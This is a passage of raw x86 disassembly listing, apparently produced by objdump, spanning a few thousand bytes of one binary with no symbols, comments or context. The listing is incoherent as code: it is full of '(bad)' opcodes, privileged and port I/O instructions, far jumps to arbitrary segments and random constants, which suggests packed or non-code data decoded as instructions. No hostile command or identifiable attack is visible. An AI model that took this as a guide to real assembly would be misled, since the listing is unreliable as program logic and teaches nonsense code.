  41dc71:	cmp    esi,DWORD PTR [ecx]
  41dc73:	ja     0x41dcb4
  41dc75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc76:	push   ebx
  41dc77:	inc    edi
  41dc78:	inc    eax
  41dc79:	fcmovbe st,st(6)
  41dc7b:	aaa    
  41dc7c:	sar    DWORD PTR [eax+ebp*4],0xfe
  41dc80:	jns    0x41dc62
  41dc82:	ins    BYTE PTR es:[edi],dx
  41dc83:	push   esi
  41dc84:	sbb    BYTE PTR [edi],bl
  41dc86:	push   edx
  41dc87:	(bad)  
  41dc88:	ins    BYTE PTR es:[edi],dx
  41dc89:	xchg   ebp,eax
  41dc8a:	fcomp  DWORD PTR ds:0x2240dad2
  41dc90:	(bad)  
  41dc91:	into   
  41dc92:	mov    edx,0x789884e4
  41dc97:	pushf  
  41dc98:	cld    
  41dc99:	xor    al,0x7b
  41dc9b:	(bad)  
  41dc9c:	sub    DWORD PTR [ecx-0x64],edi
  41dc9f:	dec    ecx
  41dca0:	xchg   ebp,eax
  41dca1:	push   0xffffffd2
  41dca3:	stos   DWORD PTR es:[edi],eax
  41dca4:	scas   al,BYTE PTR es:[edi]
  41dca5:	adc    eax,0x44f44f60
  41dcaa:	sub    DWORD PTR [esp+eiz*2-0x3f56e042],edx
  41dcb1:	adc    eax,0x3d6bfe5d
  41dcb6:	pop    ebx
  41dcb7:	push   edx
  41dcb8:	rcl    DWORD PTR [esi+ecx*2+0x26f13b18],cl
  41dcbf:	xor    al,0x96
  41dcc1:	fisttp DWORD PTR [edi+0x28541ca9]
  41dcc7:	push   edi
  41dcc8:	jbe    0x41dcad
  41dcca:	jnp    0x41dcd0
  41dccc:	shr    DWORD PTR [eax+0x452a0406],cl
  41dcd2:	stc    
  41dcd3:	xor    eax,0x6f21eaee
  41dcd8:	cmp    dh,ch
  41dcda:	aam    0xe7
  41dcdc:	xor    al,0x95
  41dcde:	lahf   
  41dcdf:	das    
  41dce0:	in     eax,0x79
  41dce2:	sub    al,0xbe
  41dce4:	add    edi,edx
  41dce6:	mov    WORD PTR [edx-0x103c80cb],?
  41dcec:	fld    TBYTE PTR [eax-0x16ebecc3]
  41dcf2:	xchg   BYTE PTR [ebx-0x6cfd5e44],dh
  41dcf8:	push   edx
  41dcf9:	ror    DWORD PTR [esi-0x56],cl
  41dcfc:	xchg   esp,eax
  41dcfd:	sar    BYTE PTR [ecx],0x72
  41dd00:	mov    ah,BYTE PTR [eax+eiz*2-0x43]
  41dd04:	retf   0x9eef
  41dd07:	es and al,ah
  41dd0a:	btc    edi,0xdd
  41dd0e:	movlps QWORD PTR [edi],xmm4
  41dd11:	adc    BYTE PTR [edi+edx*4-0x1b],dl
  41dd15:	or     al,0xec
  41dd17:	ins    BYTE PTR es:[edi],dx
  41dd18:	pusha  
  41dd19:	jns    0x41dd3e
  41dd1b:	jecxz  0x41dd36
  41dd1d:	mov    cl,0x56
  41dd1f:	in     eax,dx
  41dd20:	fs div ebp
  41dd23:	imul   ecx,DWORD PTR [ebx],0x6c35b91f
  41dd29:	xchg   DWORD PTR [ecx+esi*2+0x3c],esi
  41dd2d:	pop    ss
  41dd2e:	xchg   esp,eax
  41dd2f:	aam    0x8f
  41dd31:	loope  0x41dcc6
  41dd33:	fucomip st,st(6)
  41dd35:	adc    eax,0x7f9fcd1c
  41dd3a:	fldcw  WORD PTR ds:0xd9b3215
  41dd40:	pop    ebx
  41dd41:	imul   ebp,DWORD PTR [edi-0x306f7094],0x14
  41dd48:	imul   DWORD PTR [esi]
  41dd4a:	out    0xd6,eax
  41dd4c:	adc    edx,DWORD PTR [ebx+0x3fa74896]
  41dd52:	mov    bh,0x1a
  41dd54:	dec    ecx
  41dd55:	sbb    al,0xd0
  41dd57:	cs jge 0x41dd41
  41dd5a:	xor    eax,0xff5a588b
  41dd5f:	xchg   BYTE PTR [edx+0x378a2014],dh
  41dd65:	mov    bl,0xc8
  41dd67:	call   0x660:0xcddb8e4d
  41dd6e:	sub    BYTE PTR [eax-0xaea0192],0x7c
  41dd75:	mov    eax,ds:0x7a46985
  41dd7a:	jge    0x41dcfc
  41dd7c:	adc    eax,0x5e7d301b
  41dd81:	jmp    0x41dd77
  41dd83:	jno    0x41dd88
  41dd85:	mov    esi,0x426f5095
  41dd8a:	frstor [ebp+0x4e]
  41dd8d:	mov    bl,BYTE PTR [ebp+0x16b46dda]
  41dd93:	pop    ebx
  41dd94:	jle    0x41ddcb
  41dd96:	les    ebx,FWORD PTR [esi+0x3d]
  41dd99:	rol    DWORD PTR [ecx+edx*4-0x6e],0xa1
  41dd9e:	or     edi,DWORD PTR [edx+0x55513bfe]
  41dda4:	xor    BYTE PTR [ebx+0x3a],cl
  41dda7:	pop    ebp
  41dda8:	and    cl,cl
  41ddaa:	adc    BYTE PTR [edx],dh
  41ddac:	cmc    
  41ddad:	mov    edx,0x917a0b92
  41ddb2:	xchg   ebx,eax
  41ddb3:	push   ecx
  41ddb4:	jecxz  0x41dd9b
  41ddb6:	or     BYTE PTR [edx],bh
  41ddb8:	pop    ds
  41ddb9:	imul   esp,DWORD PTR [edi+0x10],0xffffffcb
  41ddbd:	lods   eax,DWORD PTR ds:[esi]
  41ddbe:	ins    DWORD PTR es:[edi],dx
  41ddbf:	mov    ch,0x6a
  41ddc1:	fwait
  41ddc2:	ror    DWORD PTR [edx+0x2d3860ba],cl
  41ddc8:	es hlt 
  41ddca:	je     0x41ddad
  41ddcc:	pop    eax
  41ddcd:	rol    DWORD PTR [esp+ebp*4-0x3f],cl
  41ddd1:	stc    
  41ddd2:	jne    0x41dda6
  41ddd4:	int3   
  41ddd5:	lock scas eax,DWORD PTR es:[edi]
  41ddd7:	jecxz  0x41ddd3
  41ddd9:	or     DWORD PTR ds:0x58104759,edx
  41dddf:	pop    ecx
  41dde0:	pop    esp
  41dde1:	xchg   ebx,eax
  41dde2:	jl     0x41dd6a
  41dde4:	fld    QWORD PTR [ecx+0x43]
  41dde7:	loope  0x41ddab
  41dde9:	mov    cl,0x7c
  41ddeb:	mov    edx,0x5fcb4e23
  41ddf0:	fidivr WORD PTR [edi-0x2d]
  41ddf3:	dec    ebp
  41ddf4:	adc    ebx,eax
  41ddf6:	es inc ecx
  41ddf8:	clc    
  41ddf9:	or     al,0x37
  41ddfb:	dec    sp
  41ddfd:	repz mov ah,0xd
  41de00:	add    BYTE PTR [ebx+0x17],bh
  41de03:	les    ebx,FWORD PTR [esi-0x69]
  41de06:	into   
  41de07:	adc    eax,0x45e27335
  41de0c:	loopne 0x41ddc1
  41de0e:	jmp    FWORD PTR [edi-0x27]
  41de11:	mov    esp,0xff638b82
  41de16:	pop    ds
  41de17:	cmp    BYTE PTR [edx-0x3d],bh
  41de1a:	cld    
  41de1b:	inc    ecx
  41de1c:	and    dh,bh
  41de1e:	repnz pusha 
  41de20:	sar    DWORD PTR [ebx+ecx*2+0x67],0xf3
  41de25:	jecxz  0x41de29
  41de27:	and    bl,0x8e
  41de2a:	test   BYTE PTR [esp+ebp*1-0x38],dh
  41de2e:	xor    ebx,esi
  41de30:	jnp    0x41dea7
  41de32:	fld    QWORD PTR [esi-0x6d022a1f]
  41de38:	lea    ebx,[esi+0x5bf1a32]
  41de3e:	xchg   edx,eax
  41de3f:	icebp  
  41de40:	adc    eax,0xb8a581cd
  41de45:	sbb    bl,BYTE PTR [eax+0x51]
  41de48:	ret    0x293
  41de4b:	test   eax,0x344bafbf
  41de50:	xor    cl,BYTE PTR [ebp+0x1c]
  41de53:	mov    BYTE PTR [ebp+0x2d],bl
  41de56:	fild   WORD PTR [edi]
  41de58:	push   ss
  41de59:	mov    edx,0x60e31cc9
  41de5e:	push   ebx
  41de5f:	rol    edi,0x66
  41de62:	nop
  41de63:	add    dh,cl
  41de65:	and    eax,0xc329fce6
  41de6a:	pop    es
  41de6b:	mov    ebx,0x4f0442ee
  41de70:	int3   
  41de71:	mov    ebx,0x112eaebb
  41de76:	dec    edi
  41de77:	inc    ebp
  41de78:	aas    
  41de79:	mov    ds:0x6a1f5b18,al
  41de7e:	scas   al,BYTE PTR es:[edi]
  41de7f:	idiv   cl
  41de81:	not    BYTE PTR [ecx+eax*8+0x47]
  41de85:	(bad)  
  41de87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de88:	out    0xdd,al
  41de8a:	sar    DWORD PTR [edi+ebp*8+0x2f83beef],0xf2
  41de92:	popa   
  41de93:	popa   
  41de94:	cwde   
  41de95:	xchg   DWORD PTR ds:0xb4441475,ebx
  41de9b:	mov    ebp,0xc30f1eb3
  41dea0:	in     eax,dx
  41dea1:	xor    edi,edx
  41dea3:	(bad)  
  41dea4:	sbb    DWORD PTR [eax],esi
  41dea6:	or     al,0x25
  41dea8:	jne    0x41dea6
  41deaa:	jno    0x41df12
  41deac:	inc    DWORD PTR [esi-0x5661dfae]
  41deb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41deb3:	mov    esi,0xa0a3fdba
  41deb8:	sbb    dh,BYTE PTR [edi-0x3]
  41debb:	pop    esp
  41debc:	scas   al,BYTE PTR es:[edi]
  41debd:	scas   al,BYTE PTR es:[edi]
  41debe:	scas   al,BYTE PTR es:[edi]
  41debf:	cmc    
  41dec0:	xor    edi,ebp
  41dec2:	xor    esi,ebx
  41dec4:	add    BYTE PTR [ebx+0x47],dh
  41dec7:	imul   eax,DWORD PTR [eax+0x1c0ccfde],0x5f60c11e
  41ded1:	call   0x8e34:0xb8348597
  41ded8:	lods   eax,DWORD PTR ds:[esi]
  41ded9:	call   DWORD PTR [esi*8+0x7af1a451]
  41dee0:	pop    edx
  41dee1:	add    eax,0x57b7f967
  41dee6:	clc    
  41dee7:	scas   al,BYTE PTR es:[edi]
  41dee8:	mov    DWORD PTR [esi-0x1e],ebx
  41deeb:	ja     0x41df5b
  41deed:	sub    ecx,ebp
  41deef:	adc    eax,esi
  41def1:	jg     0x41df23
  41def3:	nop
  41def4:	sbb    al,0x4e
  41def6:	aam    0x6b
  41def8:	lea    edx,[ecx+0x566eb1a7]
  41defe:	xor    bl,al
  41df00:	jge    0x41defd
  41df02:	or     bh,BYTE PTR [eax]
  41df04:	add    eax,0xaa750fa
  41df09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df0a:	jb     0x41decb
  41df0c:	add    eax,0x4ad31855
  41df11:	(bad)  
  41df12:	lea    ebx,[eax+0x38]
  41df15:	dec    edx
  41df16:	popf   
  41df17:	shl    DWORD PTR [eax+eax*4+0x52a8e77b],0xcc
  41df1f:	lods   eax,DWORD PTR ds:[esi]
  41df20:	or     al,0xea
  41df22:	mov    eax,0x92fd852c
  41df27:	mov    cl,0xea
  41df29:	mov    ds:0x4a963f80,al
  41df2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df2f:	call   0xa6e13803
  41df34:	js     0x41df99
  41df36:	aas    
  41df37:	dec    edx
  41df38:	out    dx,eax
  41df39:	outs   dx,DWORD PTR ds:[esi]
  41df3a:	fdiv   QWORD PTR [ebx-0x77]
  41df3d:	mov    bl,0x5d
  41df3f:	fwait
  41df40:	cld    
  41df41:	inc    ebp
  41df42:	std    
  41df43:	cmp    ebx,DWORD PTR [eax-0x38637bb3]
  41df49:	mov    bl,0xd2
  41df4b:	imul   eax,DWORD PTR [edx],0xffffff96
  41df4e:	mov    ebx,0x8f253128
  41df53:	pop    ebp
  41df54:	ds popa 
  41df56:	sahf   
  41df57:	xor    DWORD PTR [esp+ebp*1],esp
  41df5a:	or     eax,0x10b942ae
  41df5f:	shl    DWORD PTR ds:0x1253af11,cl
  41df65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df66:	xchg   edi,eax
  41df67:	xor    eax,0xfde3c337
  41df6c:	push   esp
  41df6d:	mov    bl,0x75
  41df6f:	test   al,0x9a
  41df71:	xchg   ebx,eax
  41df72:	sbb    al,0x77
  41df74:	lods   al,BYTE PTR ds:[esi]
  41df75:	jbe    0x41dfea
  41df77:	mov    esi,0xb10a8e23
  41df7c:	dec    ecx
  41df7d:	jmp    0xd0544c6a
  41df82:	dec    DWORD PTR [ebx]
  41df84:	in     al,dx
  41df85:	jno    0x41df5a
  41df87:	and    al,0xc7
  41df89:	fimul  WORD PTR [ebx]
  41df8b:	add    ebp,DWORD PTR [ebp+0x1b677baf]
  41df91:	nop
  41df92:	mov    ss,WORD PTR [eax-0x53]
  41df95:	shl    BYTE PTR [ebp-0x34e9756e],0x9
  41df9c:	add    DWORD PTR [eax],ecx
  41df9e:	loop   0x41df32
  41dfa0:	and    DWORD PTR [ecx],esi
  41dfa2:	xor    ah,BYTE PTR [eax+0x28398e23]
  41dfa8:	sbb    al,0x51
  41dfaa:	lods   al,BYTE PTR ds:[esi]
  41dfab:	cmp    esi,DWORD PTR [edi+0x3a6e6814]
  41dfb1:	je     0x41df4d
  41dfb3:	mov    al,0x46
  41dfb5:	cmp    BYTE PTR ds:0x73504c6,dl
  41dfbb:	jns    0x41df59
  41dfbd:	cmp    ch,BYTE PTR [eax+0x51]
  41dfc0:	cs mov cl,0xe5
  41dfc3:	push   ss
  41dfc4:	sbb    eax,0x868715bd
  41dfc9:	aad    0xda
  41dfcb:	leave  
  41dfcc:	(bad)  
  41dfcd:	aad    0xd1
  41dfcf:	and    DWORD PTR [esp+ebp*4+0x6b],0x104ad7b5
  41dfd7:	aaa    
  41dfd8:	cmp    BYTE PTR [eax-0x6e147098],dl
  41dfde:	dec    eax
  41dfdf:	out    dx,eax
  41dfe0:	aad    0xfc
  41dfe2:	fsub   DWORD PTR [ebx+0x5b]
  41dfe5:	push   esi
  41dfe6:	push   0x6f
  41dfe8:	test   al,ah
  41dfea:	ficomp WORD PTR [ebx]
  41dfec:	ds xor esi,edx
  41dfef:	repz jg 0x41df92
  41dff2:	fist   DWORD PTR [ecx+0x2f929a6]
  41dff8:	daa    
  41dff9:	hlt    
  41dffa:	test   al,0xd8
  41dffc:	sbb    al,BYTE PTR [edi]
  41dffe:	stc    
  41dfff:	and    DWORD PTR [edi+ecx*2-0x7],ebx
  41e003:	sbb    al,0x94
  41e005:	xor    BYTE PTR [ecx],bl
  41e007:	jecxz  0x41dfb0
  41e009:	stos   DWORD PTR es:[edi],eax
  41e00a:	test   DWORD PTR [esi+ebp*8],ebp
  41e00d:	xchg   esp,eax
  41e00e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e00f:	loop   0x41e036
  41e011:	jecxz  0x41e05f
  41e013:	mov    edi,0x9f705c43
  41e018:	mov    esi,edx
  41e01a:	add    eax,0x8a5c367f
  41e01f:	sub    dl,bh
  41e021:	cmp    al,0x86
  41e023:	mov    bh,al
  41e025:	repnz out dx,al
  41e027:	ins    DWORD PTR es:[edi],dx
  41e028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e029:	mov    ebx,0x20c25abc
  41e02e:	or     dl,BYTE PTR ds:0xc458ccb1
  41e034:	xchg   BYTE PTR fs:[edi-0x3c],cl
  41e038:	push   0x852f6a3
  41e03d:	scas   eax,DWORD PTR es:[edi]
  41e03e:	jp     0x41e093
  41e040:	ret    
  41e041:	push   ss
  41e042:	xchg   edx,eax
  41e043:	add    BYTE PTR [esp+esi*8],dh
  41e046:	cmp    BYTE PTR [eax],bl
  41e048:	int    0x30
  41e04a:	popa   
  41e04b:	ins    BYTE PTR es:[edi],dx
  41e04c:	dec    edi
  41e04d:	ss or  esi,eax
  41e050:	aam    0xd3
  41e052:	jns    0x41e076
  41e054:	add    BYTE PTR [eax],dl
  41e056:	repz jmp 0x49b19dc3
  41e05c:	xor    al,0x76
  41e05e:	adc    BYTE PTR [eax+0x64142772],dl
  41e064:	pop    edi
  41e065:	pop    esi
  41e066:	push   eax
  41e067:	and    DWORD PTR [edx-0x6c],ebp
  41e06a:	sahf   
  41e06b:	pushf  
  41e06c:	outs   dx,BYTE PTR ds:[esi]
  41e06d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e06e:	jb     0x41e05f
  41e070:	lods   al,BYTE PTR ds:[esi]
  41e071:	sbb    eax,0x878801b3
  41e076:	fwait
  41e077:	jae    0x41e0b6
  41e079:	adc    al,0x6f
  41e07b:	wrmsr  
  41e07d:	pop    ecx
  41e07e:	pop    ebp
  41e07f:	inc    eax
  41e080:	push   eax
  41e081:	out    dx,eax
  41e082:	dec    ebx
  41e083:	cwde   
  41e084:	call   0x4b4601d6
  41e089:	cmc    
  41e08a:	in     eax,dx
  41e08b:	and    dh,BYTE PTR [esi-0x9ac37bb]
  41e091:	ss sub bl,bl
  41e094:	(bad)  
  41e095:	in     eax,0x60
  41e097:	shl    DWORD PTR [esp+eiz*8+0x2f9504d7],cl
  41e09e:	int3   
  41e09f:	(bad)  
  41e0a0:	dec    ebx
  41e0a1:	sbb    dh,ch
  41e0a3:	loop   0x41e0ec
  41e0a5:	ret    
  41e0a6:	sbb    edi,ecx
  41e0a8:	das    
  41e0a9:	push   ebx
  41e0aa:	and    ebx,ebp
  41e0ac:	mov    ds:0x72402113,eax
  41e0b1:	gs mov edx,0x4a22fb86
  41e0b7:	out    0x5d,eax
  41e0b9:	fld    QWORD PTR [ecx]
  41e0bb:	mov    gs:0x32a9d149,al
  41e0c1:	adc    al,0x51
  41e0c3:	push   ecx
  41e0c4:	repz jno 0x41e06d
  41e0c7:	es cdq 
  41e0c9:	push   cs
  41e0ca:	push   0x36
  41e0cc:	iret   
  41e0cd:	fs inc edx
  41e0cf:	out    dx,al
  41e0d0:	jae    0x41e113
  41e0d2:	dec    DWORD PTR [edi-0x63]
  41e0d5:	push   0x63480aa3
  41e0da:	or     al,BYTE PTR [eax+ebp*1-0x744056c1]
  41e0e1:	or     dh,ch
  41e0e3:	cmp    eax,0xcdf366c4
  41e0e8:	sbb    eax,edx
  41e0ea:	retf   
  41e0eb:	lahf   
  41e0ec:	add    eax,0x6f94c11
  41e0f1:	inc    eax
  41e0f2:	ficomp WORD PTR [ecx-0x11db04c6]
  41e0f8:	jno    0x41e085
  41e0fa:	push   ebx
  41e0fb:	xchg   DWORD PTR [ecx+0x375c07c2],edx
  41e101:	xor    eax,0x89917bb5
  41e106:	mov    ah,BYTE PTR [edx]
  41e108:	push   edx
  41e109:	fdivr  QWORD PTR gs:[ebx]
  41e10c:	ret    0xc66e
  41e10f:	cmp    eax,0xef649510
  41e114:	push   ss
  41e115:	and    al,0xb7
  41e117:	dec    ebx
  41e118:	stos   DWORD PTR es:[edi],eax
  41e119:	xchg   ebp,eax
  41e11a:	(bad)
  41e11f:	mov    ah,0x75
  41e121:	test   al,0xb8
  41e123:	mov    cl,0xf5
  41e125:	fwait
  41e126:	daa    
  41e127:	jo     0x41e17d
  41e129:	ret    
  41e12a:	stc    
  41e12b:	imul   eax,DWORD PTR gs:[eax],0x3edefd6f
  41e132:	mov    esi,ds
  41e134:	stos   BYTE PTR es:[edi],al
  41e135:	mov    esp,0xa4619a0b
  41e13a:	popf   
  41e13b:	sbb    eax,0xe9c97a6
  41e140:	ins    BYTE PTR es:[edi],dx
  41e141:	inc    edx
  41e142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e143:	pop    esi
  41e144:	xchg   ebx,eax
  41e145:	leave  
  41e146:	imul   edi,DWORD PTR [ebx-0x34],0x3c
  41e14a:	cwde   
  41e14b:	scas   eax,DWORD PTR es:[edi]
  41e14c:	hlt    
  41e14d:	ins    DWORD PTR es:[edi],dx
  41e14e:	icebp  
  41e14f:	lds    esp,FWORD PTR [eax-0x3dc97b21]
  41e155:	sbb    esp,edx
  41e157:	add    ebp,DWORD PTR [ecx-0x5265c775]
  41e15d:	fwait
  41e15e:	jae    0x41e17d
  41e160:	rol    BYTE PTR [eax],0x4
  41e163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e164:	shr    DWORD PTR [ecx+eiz*2+0x5b00d417],0xa5
  41e16c:	mov    BYTE PTR [esi-0x48],bh
  41e16f:	mov    ch,0xc4
  41e171:	ins    DWORD PTR es:[edi],dx
  41e172:	mov    WORD PTR [esi],?
  41e174:	out    0x7,eax
  41e176:	pusha  
  41e177:	mul    ebx
  41e179:	jno    0x41e1a0
  41e17b:	fidiv  DWORD PTR [edi+edx*1+0x4f098b02]
  41e182:	inc    ecx
  41e183:	pop    eax
  41e184:	xor    al,0x67
  41e186:	xchg   ebx,eax
  41e187:	jnp    0x41e182
  41e189:	out    dx,al
  41e18a:	lds    ebx,FWORD PTR [edi+0xc]
  41e18d:	pop    ds
  41e18e:	je     0x41e18c
  41e190:	outs   dx,BYTE PTR ds:[esi]
  41e191:	dec    ebx
  41e192:	arpl   dx,bx
  41e194:	cmp    dh,BYTE PTR [eax]
  41e196:	mov    DWORD PTR [ecx+eiz*8+0x6f],eax
  41e19a:	daa    
  41e19b:	xor    edi,0x12
  41e19e:	mov    dl,0xbd
  41e1a0:	mov    edx,0xcf1e70a7
  41e1a5:	je     0x41e17f
  41e1a7:	jns    0x41e21d
  41e1a9:	add    BYTE PTR [esp+edx*4-0x71943fdf],0x90
  41e1b1:	(bad)  
  41e1b3:	addr16 push edi
  41e1b5:	mov    esi,0x71195124
  41e1ba:	sub    al,0x43
  41e1bc:	imul   WORD PTR fs:0x1ad68440
  41e1c4:	out    0xd5,eax
  41e1c6:	sub    DWORD PTR [ebp+0x6264520e],ebp
  41e1cc:	call   0xa05:0x64203d5c
  41e1d3:	in     eax,dx
  41e1d4:	cld    
  41e1d5:	pop    ds
  41e1d6:	sbb    al,0x25
  41e1d8:	leave  
  41e1d9:	push   esi
  41e1da:	sbb    al,0xc
  41e1dc:	mov    dh,0x1d
  41e1de:	push   ebp
  41e1df:	sub    edi,ebp
  41e1e1:	mov    BYTE PTR [ebx-0x27],bl
  41e1e4:	xchg   ebp,edx
  41e1e6:	adc    eax,0x87dd6cc6
  41e1eb:	ss push 0x166c2f10
  41e1f1:	out    dx,al
  41e1f2:	inc    edx
  41e1f3:	ret    
  41e1f4:	cdq    
  41e1f5:	mov    edx,0xdfc6efbb
  41e1fa:	or     al,0xf7
  41e1fc:	push   edx
  41e1fd:	dec    ebp
  41e1fe:	daa    
  41e1ff:	jp     0x41e278
  41e201:	inc    ebx
  41e202:	jb     0x41e185
  41e204:	xor    esi,DWORD PTR [eax+ebp*1]
  41e207:	pop    edi
  41e208:	or     bh,BYTE PTR [esi+0x78b0e193]
  41e20e:	fld    TBYTE PTR [ecx-0x70]
  41e211:	mov    al,ds:0x2b4ee58a
  41e216:	loopne 0x41e1e0
  41e218:	cdq    
  41e219:	call   0x90bc413c
  41e21e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e21f:	jne    0x41e227
  41e221:	sbb    edx,DWORD PTR [ebx-0x61ed6b89]
  41e227:	cmp    DWORD PTR [edi],edi
  41e229:	add    ebp,DWORD PTR [eax+ecx*4+0x2501cc41]
  41e230:	ret    
  41e231:	cli    
  41e232:	stos   DWORD PTR es:[edi],eax
  41e233:	lds    eax,FWORD PTR [esi+esi*4]
  41e236:	cmp    al,0x56
  41e238:	add    BYTE PTR [ecx],cl
  41e23a:	and    ebx,DWORD PTR ds:0x2d78c4b
  41e240:	mov    edi,0xe388f62e
  41e245:	add    eax,0xfe2dc0b3
  41e24a:	pushf  
  41e24b:	or     al,0x9d
  41e24d:	push   esp
  41e24e:	arpl   WORD PTR [ebp-0x13],di
  41e251:	inc    edi
  41e252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e253:	js     0x41e23f
  41e255:	push   es
  41e256:	pop    ecx
  41e257:	add    ch,BYTE PTR [edx]
  41e259:	or     ch,BYTE PTR [edi]
  41e25b:	add    DWORD PTR [esi],0xffffff81
  41e25e:	or     BYTE PTR ds:0x9ed9ddad,bl
  41e264:	adc    eax,0x6256f461
  41e269:	retf   
  41e26a:	outs   dx,DWORD PTR ds:[esi]
  41e26b:	push   edi
  41e26c:	les    ecx,FWORD PTR [ecx+ebx*2]
  41e26f:	idiv   DWORD PTR [eax]
  41e271:	into   
  41e272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e273:	data16 daa 
  41e275:	loop   0x41e233
  41e277:	push   cs
  41e278:	inc    ebp
  41e279:	in     eax,0x9e
  41e27b:	clc    
  41e27c:	sub    bh,BYTE PTR [ebx]
  41e27e:	out    0x8a,eax
  41e280:	fwait
  41e281:	leave  
  41e282:	div    ebx
  41e284:	push   edi
  41e285:	fs lds ecx,FWORD PTR fs:[edx-0x5e]
  41e28a:	or     DWORD PTR [esi-0x28],0x13
  41e28e:	or     BYTE PTR [eax-0x2028dcf0],ch
  41e294:	das    
  41e295:	aas    
  41e296:	(bad)  
  41e297:	sar    ecx,cl
  41e299:	outs   dx,BYTE PTR ds:[esi]
  41e29a:	dec    ebp
  41e29b:	jnp    0x41e2ee
  41e29d:	aad    0xf5
  41e29f:	cmp    bh,ah
  41e2a1:	xchg   BYTE PTR [ebp+0xd151cc5],ch
  41e2a7:	clc    
  41e2a8:	dec    eax
  41e2a9:	pop    edx
  41e2aa:	and    al,0x72
  41e2ac:	push   eax
  41e2ad:	mov    DWORD PTR [edi-0xde65b6c],esi
  41e2b3:	sub    ebx,DWORD PTR [edi]
  41e2b5:	enter  0x7f07,0xce
  41e2b9:	rcr    DWORD PTR [edx],1
  41e2bb:	mov    DWORD PTR [ebx-0x166b820d],esp
  41e2c1:	cdq    
  41e2c2:	push   esi
  41e2c3:	frstor [edi-0x23fdeb5a]
  41e2c9:	or     BYTE PTR [ebx+0x7f],dl
  41e2cc:	jns    0x41e321
  41e2ce:	stos   DWORD PTR es:[edi],eax
  41e2cf:	ret    0xb2e6
  41e2d2:	inc    ebp
  41e2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2d4:	xchg   esi,eax
  41e2d5:	in     al,0xc3
  41e2d7:	gs adc ch,cl
  41e2da:	push   eax
  41e2db:	adc    BYTE PTR [edx-0x5a],cl
  41e2de:	dec    ebp
  41e2df:	shl    DWORD PTR [ebx],0xd0
  41e2e2:	loopne 0x41e293
  41e2e4:	ret    
  41e2e5:	arpl   bx,dx
  41e2e7:	outs   dx,DWORD PTR ds:[esi]
  41e2e8:	xchg   ecx,eax
  41e2e9:	mov    WORD PTR [eax],?
  41e2eb:	sbb    ebx,ebx
  41e2ed:	fbstp  TBYTE PTR [ebp+eiz*1+0x7f]
  41e2f1:	shl    BYTE PTR [esp+edi*2+0x6c],1
  41e2f5:	pushf  
  41e2f6:	loop   0x41e29e
  41e2f8:	pop    es
  41e2f9:	add    al,0xd6
  41e2fb:	push   ebp
  41e2fc:	add    BYTE PTR [eax-0x5b6542d9],0xff
  41e303:	add    esi,DWORD PTR [edi]
  41e305:	push   esp
  41e306:	pop    ds
  41e307:	rcr    BYTE PTR [eax+0x15098aae],0x47
  41e30e:	enter  0xf904,0x4e
  41e312:	mov    esp,0x99e19143
  41e317:	repnz ins BYTE PTR es:[edi],dx
  41e319:	cli    
  41e31a:	push   cs
  41e31b:	jne    0x41e360
  41e31d:	pusha  
  41e31e:	cwde   
  41e31f:	ds aam 0x21
  41e322:	adc    al,0xb3
  41e324:	loopne 0x41e300
  41e326:	xchg   edi,eax
  41e327:	imul   ebp,DWORD PTR [ebx+0xe24fcdf],0x4dc07087
  41e331:	dec    edx
  41e332:	xor    eax,0x9a11b97b
  41e337:	jg     0x41e2f7
  41e339:	out    0x17,al
  41e33b:	add    al,0x34
  41e33d:	call   0x83376631
  41e342:	pop    eax
  41e343:	(bad)  
  41e344:	imul   ebx,DWORD PTR [edx],0x2
  41e347:	adc    BYTE PTR [ebx+0x133a1d3],0xcf
  41e34e:	ret    
  41e34f:	and    bl,bh
  41e351:	xor    al,0x33
  41e353:	xor    al,0xc7
  41e355:	fsubr  QWORD PTR ds:0x325ba423
  41e35b:	(bad)  
  41e35d:	call   0x8897:0x49ee7cb4
  41e364:	xchg   al,dl
  41e366:	cs xchg ecx,eax
  41e368:	cmp    dl,bl
  41e36a:	cwde   
  41e36b:	jmp    0xeabe:0x456f5171
  41e372:	jno    0x41e355
  41e374:	addr16 xor al,cl
  41e377:	ins    BYTE PTR es:[edi],dx
  41e378:	lds    esi,FWORD PTR [edi+0x65]
  41e37b:	xchg   BYTE PTR [ecx],ch
  41e37d:	fdiv   QWORD PTR [edi-0x7e]
  41e380:	dec    esp
  41e381:	push   cs
  41e382:	fmul   st(6),st
  41e384:	mov    esp,0xf8b7a4ba
  41e389:	sahf   
  41e38a:	adc    al,0xaa
  41e38c:	neg    BYTE PTR [edi]
  41e38e:	lods   eax,DWORD PTR ds:[esi]
  41e38f:	dec    eax
  41e390:	sub    al,0xc2
  41e392:	leave  
  41e393:	and    bh,BYTE PTR [edi+0x6a928348]
  41e399:	cdq    
  41e39a:	out    0xb1,eax
  41e39c:	jecxz  0x41e3f5
  41e39e:	mov    ds:0xc01e8c5a,al
  41e3a3:	xor    dh,BYTE PTR [eax]
  41e3a5:	pushf  
  41e3a6:	dec    ebx
  41e3a7:	adc    DWORD PTR [ecx+0x770941b0],ebp
  41e3ad:	sbb    dh,bl
  41e3af:	push   edi
  41e3b0:	sahf   
  41e3b1:	xor    eax,esp
  41e3b3:	mov    edx,0x6b69fc32
  41e3b8:	daa    
  41e3b9:	mov    al,es:0xb739aac4
  41e3bf:	sub    bl,dh
  41e3c1:	(bad)  
  41e3c3:	xchg   edi,eax
  41e3c4:	dec    eax
  41e3c5:	addr16 cdq 
  41e3c7:	push   es
  41e3c8:	mov    al,0xe1
  41e3ca:	cmp    BYTE PTR [edi+0x1d],bh
  41e3cd:	(bad)  
  41e3ce:	shr    DWORD PTR [ebp+0x2f3008b1],1
  41e3d4:	fcomp  DWORD PTR [eax]
